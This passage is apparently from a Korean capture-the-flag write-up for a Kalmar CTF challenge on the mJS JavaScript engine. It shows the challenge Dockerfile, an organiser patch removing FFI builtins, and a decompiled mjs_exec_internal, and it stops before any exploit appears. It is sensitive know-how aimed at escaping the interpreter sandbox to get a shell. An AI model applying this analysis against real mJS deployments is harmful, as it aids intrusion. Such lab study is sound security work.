<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>FROM ubuntu:<span style="color:#ae81ff">22.04</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ENV DEBIAN_FRONTEND noninteractive
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>RUN apt<span style="color:#f92672">-</span>get update
</span></span><span style="display:flex;"><span>RUN apt<span style="color:#f92672">-</span>get install <span style="color:#f92672">-</span>y xinetd python3 xxd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>COPY mjs <span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>COPY ynetd <span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>COPY remote.py <span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>RUN echo <span style="color:#e6db74">&#34;kalmar{redacted}&#34;</span> <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>flag<span style="color:#f92672">-</span><span style="color:#960050;background-color:#1e0010">$</span>(head <span style="color:#f92672">-</span>c <span style="color:#ae81ff">16</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>urandom <span style="color:#f92672">|</span> xxd <span style="color:#f92672">-</span>p).txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>USER <span style="color:#ae81ff">1000</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXPOSE <span style="color:#ae81ff">10002</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CMD .<span style="color:#f92672">/</span>ynetd <span style="color:#f92672">-</span>p <span style="color:#ae81ff">10002</span> <span style="color:#e6db74">&#34;timeout 60 ./remote.py&#34;</span>
</span></span></code></pre></div><p>22.04이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>Makefile b<span style="color:#f92672">/</span>Makefile
</span></span><span style="display:flex;"><span>index d265d7e..d495e84 <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>Makefile
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>Makefile
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span> BUILD_DIR <span style="color:#f92672">=</span> build
</span></span><span style="display:flex;"><span> RD <span style="color:#f92672">?=</span> docker run <span style="color:#f92672">-</span>v <span style="color:#960050;background-color:#1e0010">$</span>(CURDIR)<span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">$</span>(CURDIR) <span style="color:#f92672">--</span>user<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">$</span>(shell id <span style="color:#f92672">-</span>u)<span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">$</span>(shell id <span style="color:#f92672">-</span>g) <span style="color:#f92672">-</span>w <span style="color:#960050;background-color:#1e0010">$</span>(CURDIR)
</span></span><span style="display:flex;"><span> DOCKER_GCC <span style="color:#f92672">?=</span> <span style="color:#960050;background-color:#1e0010">$</span>(RD) mgos<span style="color:#f92672">/</span>gcc
</span></span><span style="display:flex;"><span> DOCKER_CLANG <span style="color:#f92672">?=</span> <span style="color:#960050;background-color:#1e0010">$</span>(RD) mgos<span style="color:#f92672">/</span>clang
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>CC <span style="color:#f92672">=</span> clang
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> include <span style="color:#960050;background-color:#1e0010">$</span>(SRCPATH)<span style="color:#f92672">/</span>mjs_sources.mk
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">81</span>,<span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">82</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span> CFLAGS <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">$</span>(COMMON_CFLAGS)
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># NOTE: we compile straight from sources, not from the single amalgamated file,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#75715e"># in order to make sure that all sources include the right headers
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#960050;background-color:#1e0010">$</span>(PROG)<span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">$</span>(TOP_MJS_SOURCES) <span style="color:#960050;background-color:#1e0010">$</span>(TOP_COMMON_SOURCES) <span style="color:#960050;background-color:#1e0010">$</span>(TOP_HEADERS) <span style="color:#960050;background-color:#1e0010">$</span>(BUILD_DIR)
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>	<span style="color:#960050;background-color:#1e0010">$</span>(DOCKER_CLANG) clang <span style="color:#960050;background-color:#1e0010">$</span>(CFLAGS) <span style="color:#960050;background-color:#1e0010">$</span>(TOP_MJS_SOURCES) <span style="color:#960050;background-color:#1e0010">$</span>(TOP_COMMON_SOURCES) <span style="color:#f92672">-</span>o <span style="color:#960050;background-color:#1e0010">$</span>(PROG)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>	<span style="color:#960050;background-color:#1e0010">$</span>(CC) <span style="color:#960050;background-color:#1e0010">$</span>(CFLAGS) <span style="color:#960050;background-color:#1e0010">$</span>(TOP_MJS_SOURCES) <span style="color:#960050;background-color:#1e0010">$</span>(TOP_COMMON_SOURCES) <span style="color:#f92672">-</span>o <span style="color:#960050;background-color:#1e0010">$</span>(PROG)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">$</span>(BUILD_DIR)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span> 	mkdir <span style="color:#f92672">-</span>p <span style="color:#960050;background-color:#1e0010">$@</span>
</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>mjs_builtin.c b<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>mjs_builtin.c
</span></span><span style="display:flex;"><span>index <span style="color:#ae81ff">6f51e08</span>.<span style="color:#ae81ff">.36</span>c2b43 <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>mjs_builtin.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>mjs_builtin.c
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">137</span>,<span style="color:#ae81ff">12</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">137</span>,<span style="color:#ae81ff">12</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mjs_init_builtin</span>(<span style="color:#66d9ef">struct</span> mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">mjs_val_t</span> obj) {
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_load));
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">mjs_set</span>(mjs, obj, <span style="color:#e6db74">&#34;print&#34;</span>, <span style="color:#f92672">~</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_print));
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>  <span style="color:#a6e22e">mjs_set</span>(mjs, obj, <span style="color:#e6db74">&#34;ffi&#34;</span>, <span style="color:#f92672">~</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>          <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_ffi_call));
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>  <span style="color:#a6e22e">mjs_set</span>(mjs, obj, <span style="color:#e6db74">&#34;ffi_cb_free&#34;</span>, <span style="color:#f92672">~</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>          <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_ffi_cb_free));
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>  <span style="color:#a6e22e">mjs_set</span>(mjs, obj, <span style="color:#e6db74">&#34;mkstr&#34;</span>, <span style="color:#f92672">~</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>          <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_mkstr));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#75715e">/* mjs_set(mjs, obj, &#34;ffi&#34;, ~0, */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#75715e">/*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#75715e">/* mjs_set(mjs, obj, &#34;ffi_cb_free&#34;, ~0, */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#75715e">/*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#75715e">/* mjs_set(mjs, obj, &#34;mkstr&#34;, ~0, */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#75715e">/*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */</span>
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">mjs_set</span>(mjs, obj, <span style="color:#e6db74">&#34;getMJS&#34;</span>, <span style="color:#f92672">~</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_get_mjs));
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">mjs_set</span>(mjs, obj, <span style="color:#e6db74">&#34;die&#34;</span>, <span style="color:#f92672">~</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">151</span>,<span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">151</span>,<span style="color:#ae81ff">8</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mjs_init_builtin</span>(<span style="color:#66d9ef">struct</span> mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">mjs_val_t</span> obj) {
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_do_gc));
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">mjs_set</span>(mjs, obj, <span style="color:#e6db74">&#34;chr&#34;</span>, <span style="color:#f92672">~</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_chr));
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>  <span style="color:#a6e22e">mjs_set</span>(mjs, obj, <span style="color:#e6db74">&#34;s2o&#34;</span>, <span style="color:#f92672">~</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>          <span style="color:#a6e22e">mjs_mk_foreign_func</span>(mjs, (<span style="color:#66d9ef">mjs_func_ptr_t</span>) mjs_s2o));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#75715e">/* mjs_set(mjs, obj, &#34;s2o&#34;, ~0, */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>  <span style="color:#75715e">/*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    * Populate JSON.parse() and JSON.stringify()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">diff --git a/src/mjs_exec.c b/src/mjs_exec.c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">index bd48fea..24c2c7c 100644
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--- a/src/mjs_exec.c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+++ b/src/mjs_exec.c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -835,7 +835,7 @@ MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">           *func = MJS_UNDEFINED;  // Return value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">           // LOG(LL_VERBOSE_DEBUG, (&#34;CALLING  %d&#34;, i + 1));
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">-        } else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+        } else if (mjs_is_ffi_sig(*func)) {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">           /* Call ffi-ed function */</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">call_stack_push_frame</span>(mjs, bp.start_idx <span style="color:#f92672">+</span> i, retval_stack_idx);
</span></span></code></pre></div><p>patch.diff가 주어진다.</p>
<pre tabindex="0"><code>https://github.com/cesanta/mjs
diff.patch is just hardening :)
</code></pre><p>README.txt가 주어졌다.
diff.patch는 그냥 hardening 이라고 한다.</p>
<p><a href="https://github.com/cesanta/mjs">https://github.com/cesanta/mjs</a>
깃허브에 들어가보면 diff에서 ffi를 왜 없애는지 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> .<span style="color:#f92672">/</span>build<span style="color:#f92672">/</span>mjs <span style="color:#f92672">-</span>e <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">ffi</span>(<span style="color:#e6db74">&#34;double sin(double)&#34;</span>)(<span style="color:#ae81ff">1.23</span>)<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0.942489</span>
</span></span></code></pre></div><p>다음과 같이 쓸 수 있어서, system으로 바로 따는걸 막기 위해서 일부러 없애놓은 것 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_exec_internal</span>(mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>code, <span style="color:#66d9ef">int</span> generate_jsc, <span style="color:#66d9ef">mjs_val_t</span> <span style="color:#f92672">*</span>res)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> v5; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _QWORD v9[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-B0h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>v10; <span style="color:#75715e">// [rsp+10h] [rbp-A0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename; <span style="color:#75715e">// [rsp+18h] [rbp-98h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v12; <span style="color:#75715e">// [rsp+20h] [rbp-90h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  FILE <span style="color:#f92672">*</span>fp; <span style="color:#75715e">// [rsp+28h] [rbp-88h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data; <span style="color:#75715e">// [rsp+30h] [rbp-80h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> size; <span style="color:#75715e">// [rsp+38h] [rbp-78h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs_bcode_part <span style="color:#f92672">*</span>bp_0; <span style="color:#75715e">// [rsp+40h] [rbp-70h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> __vla_expr0; <span style="color:#75715e">// [rsp+48h] [rbp-68h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>v18; <span style="color:#75715e">// [rsp+50h] [rbp-60h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>jscext; <span style="color:#75715e">// [rsp+58h] [rbp-58h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> read_mmapped; <span style="color:#75715e">// [rsp+64h] [rbp-4Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> rewrite; <span style="color:#75715e">// [rsp+68h] [rbp-48h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> basename_len; <span style="color:#75715e">// [rsp+6Ch] [rbp-44h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>jsext; <span style="color:#75715e">// [rsp+70h] [rbp-40h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> r; <span style="color:#75715e">// [rsp+78h] [rbp-38h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> off; <span style="color:#75715e">// [rsp+80h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> <span style="color:#f92672">*</span>resa; <span style="color:#75715e">// [rsp+88h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> generate_jsca; <span style="color:#75715e">// [rsp+94h] [rbp-1Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>JS_CODE; <span style="color:#75715e">// [rsp+98h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>patha; <span style="color:#75715e">// [rsp+A0h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>mjsa; <span style="color:#75715e">// [rsp+A8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  mjsa <span style="color:#f92672">=</span> mjs;
</span></span><span style="display:flex;"><span>  patha <span style="color:#f92672">=</span> path;                                 <span style="color:#75715e">// &lt;stdin&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  JS_CODE <span style="color:#f92672">=</span> code;
</span></span><span style="display:flex;"><span>  generate_jsca <span style="color:#f92672">=</span> generate_jsc;
</span></span><span style="display:flex;"><span>  resa <span style="color:#f92672">=</span> res;
</span></span><span style="display:flex;"><span>  off <span style="color:#f92672">=</span> mjs<span style="color:#f92672">-&gt;</span>bcode_len;
</span></span><span style="display:flex;"><span>  r <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>  mjs<span style="color:#f92672">-&gt;</span>error <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_parse</span>(path, code, mjs);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( cs_log_level_0 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">4</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mjs_dump</span>(mjsa, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( generate_jsca <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    generate_jsca <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)mjsa <span style="color:#f92672">+</span> <span style="color:#ae81ff">464</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( mjsa<span style="color:#f92672">-&gt;</span>error <span style="color:#f92672">==</span> MJS_OK )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( generate_jsca )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( patha )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        jsext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
</span></span><span style="display:flex;"><span>        v12 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">strlen</span>(patha);
</span></span><span style="display:flex;"><span>        basename_len <span style="color:#f92672">=</span> v12 <span style="color:#f92672">-</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;.js&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( basename_len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#f92672">&amp;</span>patha[basename_len], jsext) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          rewrite <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          read_mmapped <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          jscext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.jsc&#34;</span>;
</span></span><span style="display:flex;"><span>          v9[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> basename_len;
</span></span><span style="display:flex;"><span>          v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;.jsc&#34;</span>);
</span></span><span style="display:flex;"><span>          v18 <span style="color:#f92672">=</span> v9;
</span></span><span style="display:flex;"><span>          filename <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v9 <span style="color:#f92672">-</span> ((basename_len <span style="color:#f92672">+</span> v5 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFF0LL</span>);
</span></span><span style="display:flex;"><span>          __vla_expr0 <span style="color:#f92672">=</span> basename_len <span style="color:#f92672">+</span> v5 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">memcpy</span>(filename, patha, basename_len);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">strcpy</span>(<span style="color:#f92672">&amp;</span>filename[basename_len], jscext);
</span></span><span style="display:flex;"><span>          v10 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>          v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_bcode_parts_cnt</span>(mjsa);
</span></span><span style="display:flex;"><span>          bp_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_bcode_part_get</span>(v10, v6 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>          data <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_mmap_file</span>(filename, <span style="color:#f92672">&amp;</span>size);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( data )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( size <span style="color:#f92672">==</span> bp_0<span style="color:#f92672">-&gt;</span>data.len <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>(data, bp_0<span style="color:#f92672">-&gt;</span>data.p, size) )
</span></span><span style="display:flex;"><span>              rewrite <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">munmap</span>(data, size);
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( rewrite )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen64</span>(filename, <span style="color:#e6db74">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( fp )
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">fwrite</span>(bp_0<span style="color:#f92672">-&gt;</span>data.p, bp_0<span style="color:#f92672">-&gt;</span>data.len, <span style="color:#ae81ff">1uLL</span>, fp);
</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">fclose</span>(fp);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_WARN, <span style="color:#e6db74">&#34;src/mjs_exec.c&#34;</span>, <span style="color:#ae81ff">1054</span>) )
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;Failed to open %s for writing&#34;</span>, filename);
</span></span><span style="display:flex;"><span>              read_mmapped <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( read_mmapped )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">free</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)bp_0<span style="color:#f92672">-&gt;</span>data.p);
</span></span><span style="display:flex;"><span>            v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_mmap_file</span>(filename, <span style="color:#f92672">&amp;</span>bp_0<span style="color:#f92672">-&gt;</span>data.len);
</span></span><span style="display:flex;"><span>            bp_0<span style="color:#f92672">-&gt;</span>data.p <span style="color:#f92672">=</span> v7;
